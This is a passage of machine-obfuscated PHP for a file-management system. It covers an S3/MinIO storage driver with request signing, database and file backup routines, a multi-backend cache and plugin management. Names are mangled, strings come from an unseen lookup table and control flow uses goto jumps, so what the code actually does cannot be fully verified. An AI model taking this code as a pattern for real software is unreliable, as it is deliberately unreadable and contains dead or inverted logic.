array($ÂÃÊ¥°–[243], $ÂÃÊ¥°–[12], $ÂÃÊ¥°–[122], $ÂÃÊ¥°–[12], "\170\x2d\x61\x6d\x7a\x2d\x64\x61\164\x65\72{$é‹”£Éı}", $ÂÃÊ¥°–[8] . $this->bucket . $ÂÃÊ¥°–[8] . $this->pathEncode($£óˆ°Èš) . $İÎİ·šî); if (strpos($İÎİ·šî, $ÂÃÊ¥°–[244]) === 0) { $åßÒëË[0] = $ÂÃÊ¥°–[245]; } if (isset($È¦µöÔ[$ÂÃÊ¥°–[246]]) && $È¦µöÔ[$ÂÃÊ¥°–[246]] == $ÂÃÊ¥°–[247]) { $åßÒëË[0] = $ÂÃÊ¥°–[247]; } $Îƒ©à²º = implode($ÂÃÊ¥°–[248], $åßÒëË); $‰Û—ë‰µ = base64_encode(hash_hmac($ÂÃÊ¥°–[249], $Îƒ©à²º, $this->secret, !0)); $ª×Ëğ“å = $ÂÃÊ¥°–[250] . $this->accessKey . $ÂÃÊ¥°–[4] . $‰Û—ë‰µ; if (strpos($İÎİ·šî, $ÂÃÊ¥°–[244]) === 0) { return array($ÂÃÊ¥°–[251] => $ª×Ëğ“å, $ÂÃÊ¥°–[241] => $é‹”£Éı); } return $ª×Ëğ“å; } public function listUploadParts($çóøúœı, $ñÕÌı…î = array()) { $ø­º°ı­ =& $_SERVER[ò«¥Ê‡å]; $ÏĞ£¬”à = str_replace($ø­º°ı­[252], $ø­º°ı­[12], $ñÕÌı…î[$ø­º°ı­[177]]); $ğÜ¾¸•Õ = $this->client->listParts($this->bucket, $çóøúœı, $ÏĞ£¬”à); if (!$ğÜ¾¸•Õ) { return !1; } unset($ñÕÌı…î[$ø­º°ı­[242]], $ñÕÌı…î[$ø­º°ı­[246]]); $ñÕÌı…î[$ø­º°ı­[96]] = $çóøúœı; $—½ƒ»øº = $this->multiUploadAuthData($çóøúœı, $ñÕÌı…î); if (empty($—½ƒ»øº)) { return !1; } return array($ø­º°ı­[251] => $—½ƒ»øº, $ø­º°ı­[241] => $ñÕÌı…î[$ø­º°ı­[241]], $ø­º°ı­[253] => $ğÜ¾¸•Õ); } public function getHost() { return parent::getHost() . $_SERVER[ò«¥Ê‡å][8] . $this->bucket; } public function size($‰ÈÀ˜Ñ‰) { $ñş¢—û¹ = $this->objectMeta($‰ÈÀ˜Ñ‰); return $ñş¢—û¹ ? $ñş¢—û¹[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function info($©¦Ş‘ò) { if ($this->isFolder($©¦Ş‘ò)) { return $this->folderInfo($©¦Ş‘ò); } else { if ($this->isFile($©¦Ş‘ò)) { return $this->fileInfo($©¦Ş‘ò); } } return !1; } public function exist($‘ÃıÀò) { return $this->isFile($‘ÃıÀò) || $this->isFolder($‘ÃıÀò); } public function isFile($™¾³Û¸¯) { return !$this->isFolder($™¾³Û¸¯) && $this->objectMeta($™¾³Û¸¯); } public function isFolder($ïˆ¥¹ë) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][168], $ïˆ¥¹ë); } protected function objectMeta($©˜ÓÕ­) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][170], $©˜ÓÕ­); } protected function _objectMeta($ÍÖªî÷Ó) { $îû†Û–‹ =& $_SERVER[ò«¥Ê‡å]; $ÍÖªî÷Ó = rtrim($ÍÖªî÷Ó, $îû†Û–‹[8]); try { $‹ªÔ¿İ˜ = $this->client->getObjectInfo($this->bucket, $ÍÖªî÷Ó); if (!isset($‹ªÔ¿İ˜[$îû†Û–‹[238]]) && isset($‹ªÔ¿İ˜[$îû†Û–‹[254]])) { $‹ªÔ¿İ˜[$îû†Û–‹[238]] = $‹ªÔ¿İ˜[$îû†Û–‹[254]]; } } catch (Exception $œ°ï§«) { $‹ªÔ¿İ˜ = !1; } if (!$‹ªÔ¿İ˜) { } return $‹ªÔ¿İ˜; } protected function _isFolder($õ›Ó¥à) { $µğõ§’ =& $_SERVER[ò«¥Ê‡å]; $õ›Ó¥à = rtrim($õ›Ó¥à, $µğõ§’[8]); if ($õ›Ó¥à == $µğõ§’[12] || $õ›Ó¥à == $µğõ§’[8]) { return !0; } $“ïÕ³Ï§ = $this->client->getBucket($this->bucket, $õ›Ó¥à, null, 1); if (empty($“ïÕ³Ï§[$µğõ§’[222]])) { return !1; } $íÆÖµã = $“ïÕ³Ï§[$µğõ§’[222]][0][$µğõ§’[32]]; return stripos($íÆÖµã, $õ›Ó¥à . $µğõ§’[8]) === 0 ? !0 : !1; if (substr($íÆÖµã, -1) == $µğõ§’[8]) { return !0; } if (get_path_this($íÆÖµã) == get_path_this($õ›Ó¥à)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($õáë™Ç) { parent::__construct($õáë™Ç); $this->signatureVersion($_SERVER[ò«¥Ê‡å][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Ì‚ùÌ§¾, $ëú¾éÔ³ = 3600) { $ÌşØì® =& $_SERVER[ò«¥Ê‡å]; $ÛÁè£¨ = $ÌşØì®[215]; $ç¨“»´ = $ÌşØì®[255]; $‡¢íı = $ÌşØì®[62]; $å¬Áøß˜ = gmdate($ÌşØì®[256]); $ùÈÀš¿¬ = gmdate($ÌşØì®[257]); $›½ñ‹¥ö = $ÌşØì®[258]; $É‚äÜ’Ñ = $ëú¾éÔ³ . $ÌşØì®[12]; $Ã£úéº = $ÌşØì®[259]; $èÁÌÍí« = array($this->accessKey, $ùÈÀš¿¬, $this->region, $‡¢íı, $›½ñ‹¥ö); $æ¬§¦«ª = implode($ÌşØì®[8], $èÁÌÍí«); $ÈŞ¿ºÆ = array($ÌşØì®[260] => gmdate($ÌşØì®[261], strtotime($ÌşØì®[262])), $ÌşØì®[263] => array(array($ÌşØì®[264] => $this->bucket), array($ÌşØì®[265] => $ÛÁè£¨), array($ÌşØì®[266], $ÌşØì®[267], $ÌşØì®[12]), array($ÌşØì®[266], $ÌşØì®[268], $ÌşØì®[12]), array($ÌşØì®[266], $ÌşØì®[269], $ÌşØì®[12]), array($ÌşØì®[270] => $Ã£úéº), array($ÌşØì®[271] => $æ¬§¦«ª), array($ÌşØì®[272] => $ç¨“»´), array($ÌşØì®[273] => $å¬Áøß˜), array($ÌşØì®[274] => $É‚äÜ’Ñ))); $Æ¢ØÔ¹ = base64_encode(json_encode($ÈŞ¿ºÆ)); $÷÷µÆ»¨ = hash_hmac($ÌşØì®[275], $ùÈÀš¿¬, $ÌşØì®[276] . $this->secret, !0); $Û«ê²òë = hash_hmac($ÌşØì®[275], $this->region, $÷÷µÆ»¨, !0); $İ¡‰õ¶ = hash_hmac($ÌşØì®[275], $‡¢íı, $Û«ê²òë, !0); $œü­Å„ = hash_hmac($ÌşØì®[275], $›½ñ‹¥ö, $İ¡‰õ¶, !0); $œÓóéî = hash_hmac($ÌşØì®[275], $Æ¢ØÔ¹, $œü­Å„); $¦á•“” = array($ÌşØì®[232] => $ÌşØì®[12], $ÌşØì®[277] => $ÌşØì®[12], $ÌşØì®[265] => $ÛÁè£¨, $ÌşØì®[270] => $Ã£úéº, $ÌşØì®[278] => $Æ¢ØÔ¹, $ÌşØì®[279] => $æ¬§¦«ª, $ÌşØì®[280] => $ç¨“»´, $ÌşØì®[281] => $å¬Áøß˜, $ÌşØì®[282] => $É‚äÜ’Ñ, $ÌşØì®[283] => $œÓóéî, $ÌşØì®[198] => $this->getHost()); return $¦á•“”; } } goto D‹Ê¬ØğíÃ; dô™ùğ³Ğ³: class BackupDbFile { public function __construct() { } public function index() { $¯ŸÖÁ =& $_SERVER[ò«¥Ê‡å]; $ËÏ‚Ê¡“ = Backup::get(); $ş¨¨àï¤ = $ËÏ‚Ê¡“[$¯ŸÖÁ[32]]; $ŠŒ‚Âª‰ = $this->tmpFilesPath() . "\142\141\143\153\x75\x70\137{$ş¨¨àï¤}\x2f"; $Ÿƒ°‘¬‹ = $this->backupPath($ËÏ‚Ê¡“); if (!($Ÿƒ°‘¬‹ = IO::mkdir($Ÿƒ°‘¬‹))) { return !1; } $·°³÷²ş = IO::listPath($ŠŒ‚Âª‰); $„§Ó½åñ = isset($·°³÷²ş[$¯ŸÖÁ[85]]) ? $·°³÷²ş[$¯ŸÖÁ[85]] : array(); $¥§ªÜ÷ß = array_sum(array_column($„§Ó½åñ, $¯ŸÖÁ[78])); if (!$¥§ªÜ÷ß) { return !1; } $Õ¤òÌ•¿ = array($¯ŸÖÁ[844] => $¥§ªÜ÷ß, $¯ŸÖÁ[845] => time()); Backup::set($Õ¤òÌ•¿); $¥ÈéÚú = new TaskFileTransfer($¯ŸÖÁ[846], $¯ŸÖÁ[819], count($„§Ó½åñ), LNG($¯ŸÖÁ[820]) . $¯ŸÖÁ[432] . LNG($¯ŸÖÁ[822]) . $¯ŸÖÁ[847]); $¥ÈéÚú->task[$¯ŸÖÁ[802]] = $¥§ªÜ÷ß; foreach ($·°³÷²ş[$¯ŸÖÁ[85]] as $—ƒÙâ¤’) { $÷îËëÁ® = IO::move($—ƒÙâ¤’[$¯ŸÖÁ[86]], $Ÿƒ°‘¬‹); if (!$÷îËëÁ®) { $¥ÈéÚú->end(); $¢œ±¾É˜ = IO::getLastError($¯ŸÖÁ[848] . $—ƒÙâ¤’[$¯ŸÖÁ[86]] . $¯ŸÖÁ[849] . $Ÿƒ°‘¬‹ . $¯ŸÖÁ[167]); write_log($¢œ±¾É˜, $¯ŸÖÁ[819]); return !1; } } $¼°¾ßÖ½ = new DbManage(); $ü‚œãÛ† = $¼°¾ßÖ½->getSqlFile(); if (!$ü‚œãÛ†[$¯ŸÖÁ[850]] || !$ü‚œãÛ†[$¯ŸÖÁ[13]]) { return !1; } IO::move($ü‚œãÛ†[$¯ŸÖÁ[850]], $Ÿƒ°‘¬‹); IO::move($ü‚œãÛ†[$¯ŸÖÁ[13]], $Ÿƒ°‘¬‹); $¥ÈéÚú->end(); $Õ¤òÌ•¿ = array($¯ŸÖÁ[851] => $¥§ªÜ÷ß, $¯ŸÖÁ[852] => time()); Backup::set($Õ¤òÌ•¿); return !0; } private function backupPath($“‡åù) { $öí ×«õ =& $_SERVER[ò«¥Ê‡å]; $™†ËˆÌƒ = $“‡åù[$öí ×«õ[32]]; $³Ûˆ´Üç = Model($öí ×«õ[809])->get($öí ×«õ[810]); $ÚŸşöÀ½ = substr(md5($öí ×«õ[811] . $³Ûˆ´Üç . $™†ËˆÌƒ), 0, 8); return "\x7b\x69\157\72{$“‡åù[$öí ×«õ[790]]}\175\57\x64\x61\164\141\142\x61\163\145\57\142\x61\143\x6b\165\x70\x2f" . $™†ËˆÌƒ . $öí ×«õ[11] . $ÚŸşöÀ½; } private function tmpFilesPath() { $›œ¦¼ =& $_SERVER[ò«¥Ê‡å]; $ÒŒŸ€ˆå = TEMP_FILES; if ($GLOBALS[$›œ¦¼[6]][$›œ¦¼[91]][$›œ¦¼[835]]) { $ÒŒŸ€ˆå = $GLOBALS[$›œ¦¼[6]][$›œ¦¼[91]][$›œ¦¼[835]]; if (!mk_dir($ÒŒŸ€ˆå) || !is_writable($ÒŒŸ€ˆå) || !IO::mkfile($ÒŒŸ€ˆå . $›œ¦¼[836])) { $ÒŒŸ€ˆå = TEMP_FILES; } } return $ÒŒŸ€ˆå; } } class BackupFile { public function __construct() { } public function index() { $ ÀÅÅÈĞ = Backup::get(); $¡‘–Éêå = $ ÀÅÅÈĞ[$_SERVER[ò«¥Ê‡å][339]][$_SERVER[ò«¥Ê‡å][216]][$_SERVER[ò«¥Ê‡å][511]]; $âš¿¢Ù» = array($_SERVER[ò«¥Ê‡å][512] => array($_SERVER[ò«¥Ê‡å][853], $¡‘–Éêå), $_SERVER[ò«¥Ê‡å][854] => array($_SERVER[ò«¥Ê‡å][377], $ ÀÅÅÈĞ[$_SERVER[ò«¥Ê‡å][790]])); $³ÓÅóüå = (int) Model($_SERVER[ò«¥Ê‡å][828])->where($âš¿¢Ù»)->count($_SERVER[ò«¥Ê‡å][511]); $âÚ¿Ø€ = (int) Model($_SERVER[ò«¥Ê‡å][828])->where($âš¿¢Ù»)->sum($_SERVER[ò«¥Ê‡å][78]); $ÁÆÊÒ´Š = new TaskFileTransfer($_SERVER[ò«¥Ê‡å][855], $_SERVER[ò«¥Ê‡å][819], $³ÓÅóüå, LNG($_SERVER[ò«¥Ê‡å][820]) . $_SERVER[ò«¥Ê‡å][821] . LNG($_SERVER[ò«¥Ê‡å][856])); $ÁÆÊÒ´Š->task[$_SERVER[ò«¥Ê‡å][802]] = $âÚ¿Ø€; $€¥¥¢È = array($_SERVER[ò«¥Ê‡å][857] => $³ÓÅóüå, $_SERVER[ò«¥Ê‡å][858] => $âÚ¿Ø€, $_SERVER[ò«¥Ê‡å][859] => time()); Backup::set($€¥¥¢È); $˜„£ôå¶ = !0; $ùİü¥…œ = $this->storeIds(); $‹”îèà• = 1; $¸‡Ô¬€ü = 1000; $ƒ·ıüÒ“ = $™ğø¬€¿ = 0; $Íó˜ÒØñ = array(); $´ÍŒ„³» = $‚ùûğß™ = 0; do { $çÄ„Î€û = $_SERVER[ò«¥Ê‡å][860]; $·ôî€« = Model($_SERVER[ò«¥Ê‡å][828])->where($âš¿¢Ù»)->field($çÄ„Î€û)->order($_SERVER[ò«¥Ê‡å][861])->selectPage($¸‡Ô¬€ü, $‹”îèà•); $ìşô©å³ = !empty($·ôî€«[$_SERVER[ò«¥Ê‡å][415]]) ? $·ôî€«[$_SERVER[ò«¥Ê‡å][415]] : array(); foreach ($ìşô©å³ as $àÁ˜©û³) { if (!$this->_fileExist($àÁ˜©û³, $Íó˜ÒØñ, $ùİü¥…œ)) { $³ÓÅóüå -= 1; $âÚ¿Ø€ -= (int) $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][78]]; write_log("\146\151\x6c\x65\40\x6e\x6f\164\40\x65\x78\151\x73\164\56\x66\151\154\145\x49\x44\72{$àÁ˜©û³[$_SERVER[ò«¥Ê‡å][511]]}\x2c\40\160\141\x74\150\x3a{$àÁ˜©û³[$_SERVER[ò«¥Ê‡å][86]]}", $_SERVER[ò«¥Ê‡å][862]); continue; } $ÍÚìÄÌÑ = $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][86]]; $ß¶úüş¾ = "\173\151\x6f\x3a{$ ÀÅÅÈĞ[$_SERVER[ò«¥Ê‡å][790]]}\x7d" . substr($ÍÚìÄÌÑ, strlen("\x7b\151\157\x3a{$àÁ˜©û³[$_SERVER[ò«¥Ê‡å][863]]}\x7d")); if (IO::exist($ß¶úüş¾)) { $ÁÆÊÒ´Š->updateFileEnd($àÁ˜©û³[$_SERVER[ò«¥Ê‡å][32]], $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][78]]); } else { $ß¶úüş¾ = get_path_father($ß¶úüş¾); IO::mkdir($ß¶úüş¾); if (!IO::copy($ÍÚìÄÌÑ, $ß¶úüş¾, $_SERVER[ò«¥Ê‡å][864])) { write_log($_SERVER[ò«¥Ê‡å][865] . $ÍÚìÄÌÑ . $_SERVER[ò«¥Ê‡å][849] . $ß¶úüş¾ . $_SERVER[ò«¥Ê‡å][167], $_SERVER[ò«¥Ê‡å][819]); $˜„£ôå¶ = !1; break; } } $¡‘–Éêå = $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][511]]; $™ğø¬€¿ += 1; $ƒ·ıüÒ“ += $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][78]]; $‚ùûğß™ += 1; $´ÍŒ„³» += $àÁ˜©û³[$_SERVER[ò«¥Ê‡å][78]]; if ($ƒ·ıüÒ“ >= 1024 * 1024 * 100) { $€¥¥¢È = array($_SERVER[ò«¥Ê‡å][866] => $¡‘–Éêå, $_SERVER[ò«¥Ê‡å][867] => $‚ùûğß™, $_SERVER[ò«¥Ê‡å][868] => $´ÍŒ„³»); Backup::set($€¥¥¢È); $ƒ·ıüÒ“ = $™ğø¬€¿ = 0; } } $Ğ¶¥ô³ = count($ìşô©å³); $‹”îèà•++; } while ($Ğ¶¥ô³ == $¸‡Ô¬€ü); $ÁÆÊÒ´Š->end(); $€¥¥¢È = array($_SERVER[ò«¥Ê‡å][869] => 1, $_SERVER[ò«¥Ê‡å][800] => time(), $_SERVER[ò«¥Ê‡å][814] => 1, $_SERVER[ò«¥Ê‡å][866] => $¡‘–Éêå, $_SERVER[ò«¥Ê‡å][858] => $âÚ¿Ø€, $_SERVER[ò«¥Ê‡å][857] => $³ÓÅóüå, $_SERVER[ò«¥Ê‡å][870] => time()); if ($™ğø¬€¿) { $€¥¥¢È[$_SERVER[ò«¥Ê‡å][867]] = $‚ùûğß™; $€¥¥¢È[$_SERVER[ò«¥Ê‡å][868]] = $´ÍŒ„³»; } Backup::set($€¥¥¢È); $this->_fileFilter($Íó˜ÒØñ); return !0; } private function _fileExist($«¯‚Šîâ, &$­€¯Š, $í…ÌÙí­) { $À„¼Ä‹ö =& $_SERVER[ò«¥Ê‡å]; $öéƒ¸ÃÛ = $«¯‚Šîâ[$À„¼Ä‹ö[86]]; if (in_array($«¯‚Šîâ[$À„¼Ä‹ö[511]], $­€¯Š)) { return !1; } if (!in_array($«¯‚Šîâ[$À„¼Ä‹ö[863]], $í…ÌÙí­)) { return !1; } if (IO::exist($öéƒ¸ÃÛ)) { return !0; } $‡ëñ‡ŞÑ = get_path_father($öéƒ¸ÃÛ); if (IO::exist($‡ëñ‡ŞÑ)) { $­€¯Š[] = $«¯‚Šîâ[$À„¼Ä‹ö[511]]; return !1; } $•ÊÀ¡¿ú = array($À„¼Ä‹ö[863] => $«¯‚Šîâ[$À„¼Ä‹ö[863]], $À„¼Ä‹ö[86] => array($À„¼Ä‹ö[429], "{$‡ëñ‡ŞÑ}\x25")); $ñ½Ÿ°ë = Model($À„¼Ä‹ö[828])->where($•ÊÀ¡¿ú)->field($À„¼Ä‹ö[512])->select(); $­€¯Š = array_merge($­€¯Š, array_to_keyvalue($ñ½Ÿ°ë, $À„¼Ä‹ö[12], $À„¼Ä‹ö[511])); return !1; } private function _fileFilter($ó’ØİŠÅ) { $û¬åï¢ä =& $_SERVER[ò«¥Ê‡å]; if (empty($ó’ØİŠÅ)) { return; } $ÓµšîÈ = array($û¬åï¢ä[511] => array($û¬åï¢ä[7], array_unique($ó’ØİŠÅ))); $›™Å‰·Õ = Model($û¬åï¢ä[871])->where($ÓµšîÈ)->field($û¬åï¢ä[183])->select(); foreach ($›™Å‰·Õ as $Ó®Ÿ±÷â) { Model($û¬åï¢ä[871])->remove($Ó®Ÿ±÷â[$û¬åï¢ä[183]], !1); } } private function storeIds() { $Ïçº—¢š =& $_SERVER[ò«¥Ê‡å]; $ö—äÓ = Model($Ïçº—¢š[806])->listData(); $—û¡Ÿ£ó = array(); $€Àéê—º = $GLOBALS[$Ïçº—¢š[6]][$Ïçº—¢š[91]][$Ïçº—¢š[872]]; foreach ($ö—äÓ as $ş¾‚äŠå) { $ò§´ŸÇ½ = strtolower($ş¾‚äŠå[$Ïçº—¢š[97]]); if (!isset($€Àéê—º[$ò§´ŸÇ½])) { continue; } $Ø­Ò¯ÁÁ = $Ïçº—¢š[76] . (isset($€Àéê—º[$ò§´ŸÇ½]) ? $€Àéê—º[$ò§´ŸÇ½] : ucfirst($ò§´ŸÇ½)); if (!class_exists($Ø­Ò¯ÁÁ)) { continue; } $—û¡Ÿ£ó[] = $ş¾‚äŠå[$Ïçº—¢š[445]]; } return $—û¡Ÿ£ó; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÖŒíäÚ =& $_SERVER[ò«¥Ê‡å]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ü¸ºø²Ó = $GLOBALS[$ÖŒíäÚ[6]][$ÖŒíäÚ[395]]; $±Êøû¨ü = $ü¸ºø²Ó[$ü¸ºø²Ó[$ÖŒíäÚ[873]]]; $ñÆùè¸« = $ü¸ºø²Ó[$ÖŒíäÚ[874]]; switch ($ü¸ºø²Ó[$ÖŒíäÚ[873]]) { case $ÖŒíäÚ[21]: self::$handle = Model($ÖŒíäÚ[875]); break; case $ÖŒíäÚ[876]: self::$handle = new CacheRedis($±Êøû¨ü, $ñÆùè¸«); break; case $ÖŒíäÚ[877]: self::$handle = new CacheMemcached($±Êøû¨ü, $ñÆùè¸«); break; case $ÖŒíäÚ[216]: self::$handle = new CacheFile($±Êøû¨ü, $ñÆùè¸«); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¿ã«Í) { if (is_array($¿ã«Í) || is_object($¿ã«Í)) { $¿ã«Í = json_encode($¿ã«Í); } $¿ã«Í = rawurlencode($¿ã«Í); return md5(KOD_SITE_ID . $_SERVER[ò«¥Ê‡å][11] . $¿ã«Í); } public static function get($ÒòÃãàÀ, $Û÷ô«áø = false) { $¦„‹‡¯¤ = self::key($ÒòÃãàÀ); $Œ¯••©ç = self::init(); if ($Û÷ô«áø) { return unserialize($Œ¯••©ç->get($¦„‹‡¯¤)); } if (!isset(self::$memoryCache[$¦„‹‡¯¤])) { $³Î¹Ï‘ú = $Œ¯••©ç->get($¦„‹‡¯¤); self::$memoryCache[$¦„‹‡¯¤] = unserialize($³Î¹Ï‘ú); } return self::$memoryCache[$¦„‹‡¯¤]; } public static function set($Ô²°‚¨ó, $ŠÒîÍÍ€, $ûë¨Úâ = false) { $¬Ğ¾è™Õ =& $_SERVER[ò«¥Ê‡å]; $¨Â¯ä›Ì = self::key($Ô²°‚¨ó); if (isset(self::$memoryCache[$¨Â¯ä›Ì]) && self::$memoryCache[$¨Â¯ä›Ì] === $ŠÒîÍÍ€) { return !0; } if ($ûë¨Úâ === 0) { self::$memoryCache[$¨Â¯ä›Ì] = $ŠÒîÍÍ€; return !0; } $Ñó¸‡ÎÁ = self::init(); $ŞÔö = serialize($ŠÒîÍÍ€); CacheLock::lock($Ô²°‚¨ó . $¬Ğ¾è™Õ[878]); $Ïí°¨­ = $Ñó¸‡ÎÁ->set($¨Â¯ä›Ì, $ŞÔö, $ûë¨Úâ); self::$memoryCache[$¨Â¯ä›Ì] = $ŠÒîÍÍ€; CacheLock::unlock($Ô²°‚¨ó . $¬Ğ¾è™Õ[878]); return $Ïí°¨­; } public static function getCall($ÏÄİ‰àœ, $ò…â‡·­, $ÂÓÊ×úÃ, $äÉƒ°¾ = array()) { $ëå±×ë =& $_SERVER[ò«¥Ê‡å]; $áÉµ¦×Õ = self::get($ÏÄİ‰àœ); if ($áÉµ¦×Õ || $áÉµ¦×Õ === $ëå±×ë[12]) { return $áÉµ¦×Õ; } $áÉµ¦×Õ = call_user_func_array($ÂÓÊ×úÃ, $äÉƒ°¾); $áÉµ¦×Õ = $áÉµ¦×Õ ? $áÉµ¦×Õ : $ëå±×ë[12]; self::set($ÏÄİ‰àœ, $áÉµ¦×Õ, $ò…â‡·­); return $áÉµ¦×Õ; } public static function remove($ñÖ½ç˜Ì) { $§éç«ªÙ = self::key($ñÖ½ç˜Ì); unset(self::$memoryCache[$§éç«ªÙ]); self::clearTimeout(); CacheLock::lock($ñÖ½ç˜Ì); $°·ØïÒé = self::init()->remove($§éç«ªÙ); CacheLock::unlock($ñÖ½ç˜Ì); return $°·ØïÒé; } public static function removeMemory($ Ö´±íÓ) { $€×‚¡¾€ = self::key($ Ö´±íÓ); unset(self::$memoryCache[$€×‚¡¾€]); } public static function clearMemory($Ì¶Ã„õÔ = false) { if ($Ì¶Ã„õÔ) { $Ì¶Ã„õÔ = self::key($Ì¶Ã„õÔ); unset(self::$memoryCache[$Ì¶Ã„õÔ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ò«¥Ê‡å][879])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ò«¥Ê‡å][880])) { self::init()->clearTimeout(); } } } goto AÈìêÍÒÌ½; FŒéÅŒ‹·…: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x70\x6c\x75\147\151\156\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\x74\x61\164\x75\163", "\162\145\x67\151\x65\163\x74", "\143\157\x6e\x66\151\x67"); public function loadList($€Š¸òí = false) { $Ëİ˜à¶Ğ = array_to_keyvalue($this->listData(), $_SERVER[ò«¥Ê‡å][32]); if ($€Š¸òí) { return $Ëİ˜à¶Ğ[$€Š¸òí]; } return $Ëİ˜à¶Ğ; } public function init() { $úáÙÖÎ =& $_SERVER[ò«¥Ê‡å]; Hook::trigger($úáÙÖÎ[2019]); $—‰åãöë = $this->loadPluginList(); foreach ($—‰åãöë as $üºÛĞƒ¶ => $ ñß‘¡) { $Ì–¬ğ­ = $this->appAllow($üºÛĞƒ¶, $ ñß‘¡); if (!$Ì–¬ğ­) { continue; } foreach ($ ñß‘¡[$úáÙÖÎ[2020]] as $°üºı¦Ù => $‰×àÌ°Ò) { Hook::bind($°üºı¦Ù, $‰×àÌ°Ò); } } Hook::trigger($úáÙÖÎ[2021]); Hook::trigger(ACTION); } public function appAllow($Ä‹†Ğö, $üÉÖ¼ı£, $£ÄÔÑºå = true) { $º•ì„Á² =& $_SERVER[ò«¥Ê‡å]; $õŒçôÉ = PLUGIN_DIR . $Ä‹†Ğö . $º•ì„Á²[2022]; if (!is_array($üÉÖ¼ı£) || !is_array($üÉÖ¼ı£[$º•ì„Á²[2020]]) || $üÉÖ¼ı£[$º•ì„Á²[789]] != 1 || !is_file($õŒçôÉ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$º•ì„Á²[6]][$º•ì„Á²[2023]] || !$GLOBALS[$º•ì„Á²[6]][$º•ì„Á²[2024]]) { return !0; } $ìÚ÷‹ºó = explode($º•ì„Á²[50], strtolower($GLOBALS[$º•ì„Á²[6]][$º•ì„Á²[2024]])); return in_array(strtolower($Ä‹†Ğö), $ìÚ÷‹ºó) ? !1 : !0; } if ($£ÄÔÑºå && !Action($º•ì„Á²[2025])->checkAuth($Ä‹†Ğö)) { return !1; } return !0; } public function unInstall($¬îø÷´) { $²ü®„ê¿ =& $_SERVER[ò«¥Ê‡å]; $˜›‡Ú‹ù = $this->loadList($¬îø÷´); if (file_exists(PLUGIN_DIR . $¬îø÷´)) { Hook::apply($¬îø÷´ . $²ü®„ê¿[2026]); } $this->remove($˜›‡Ú‹ù[$²ü®„ê¿[445]]); } public function changeStatus($¶é¨Î™, $Üé¡§ˆ¶) { $ÀÅöøè =& $_SERVER[ò«¥Ê‡å]; $©Ã¼±ÉĞ = $this->loadList($¶é¨Î™); if ($Üé¡§ˆ¶) { Hook::apply($¶é¨Î™ . $ÀÅöøè[2027]); } $this->update($©Ã¼±ÉĞ[$ÀÅöøè[445]], array($ÀÅöøè[2028] => $Üé¡§ˆ¶)); } public function appRegist($„âßáöÉ, $Äß´ÂéÈ) { $‰ÍñÜ =& $_SERVER[ò«¥Ê‡å]; $¥ŒÙŠ¼ = $this->loadList($„âßáöÉ); if ($¥ŒÙŠ¼) { $this->update($¥ŒÙŠ¼[$‰ÍñÜ[445]], array($‰ÍñÜ[2020] => $Äß´ÂéÈ)); } else { $ëÒòÙ¦‚ = array($‰ÍñÜ[32] => $„âßáöÉ, $‰ÍñÜ[2020] => $Äß´ÂéÈ, $‰ÍñÜ[789] => 0, $‰ÍñÜ[6] => $this->getConfigDefault($„âßáöÉ)); $this->insert($ëÒòÙ¦‚); } } public function getConfigDefault($š ¶İøˆ) { $å°×Í« =& $_SERVER[ò«¥Ê‡å]; $üùì¸¾ = array(); $Ãñ¹½¿§ = $this->getPackageJson($š ¶İøˆ); if (!$Ãñ¹½¿§ && is_array($Ãñ¹½¿§[$å°×Í«[2029]])) { return $üùì¸¾; } foreach ($Ãñ¹½¿§[$å°×Í«[2029]] as $®È€àÌÈ => $ÀÉ±‹´õ) { if (!isset($ÀÉ±‹´õ[$å°×Í«[420]]) || isset($üùì¸¾[$®È€àÌÈ])) { continue; } $üùì¸¾[$®È€àÌÈ] = $ÀÉ±‹´õ[$å°×Í«[420]]; } return $üùì¸¾; } public function getPackageJson($óéŠç) { return Hook::apply($óéŠç . $_SERVER[ò«¥Ê‡å][2030]); } public function getConfig($—‘ë¾í», $˜‘øÍ‰ = false) { $ù‚¸¬ =& $_SERVER[ò«¥Ê‡å]; $ˆşà‘ŸŠ = array(); $†ÀÚ· = $this->loadList($—‘ë¾í»); if ($†ÀÚ· && is_array($†ÀÚ·[$ù‚¸¬[6]])) { $ˆşà‘ŸŠ = $†ÀÚ·[$ù‚¸¬[6]]; } if (!$ˆşà‘ŸŠ || $˜‘øÍ‰) { $ˆşà‘ŸŠ = $this->getConfigDefault($—‘ë¾í»); } return $ˆşà‘ŸŠ; } public function setConfig($ÛØÏ¶³, $‡ËàêÖÀ = false) { $ªØ÷Ì‰‚ =& $_SERVER[ò«¥Ê‡å]; $ˆä³Éèé = $this->loadList($ÛØÏ¶³); if (!$ˆä³Éèé) { return !1; } $ß»“Şµ• = $ˆä³Éèé[$ªØ÷Ì‰‚[6]]; if ($‡ËàêÖÀ == !1) { $ß»“Şµ• = array(); $‡ËàêÖÀ = $this->getConfigDefault($ÛØÏ¶³); } foreach ($‡ËàêÖÀ as $‘‹áÆö­ => $Ü±ñø÷Ë) { $ß»“Şµ•[$‘‹áÆö­] = is_string($Ü±ñø÷Ë) ? trim($Ü±ñø÷Ë) : $Ü±ñø÷Ë; } $this->update($ˆä³Éèé[$ªØ÷Ì‰‚[445]], array($ªØ÷Ì‰‚[6] => $ß»“Şµ•)); } public function viewList() { $î‚…š† =& $_SERVER[ò«¥Ê‡å]; $êñˆÉ‚ó = $this->loadList(); $this->pluginScan($êñˆÉ‚ó); $êñˆÉ‚ó = 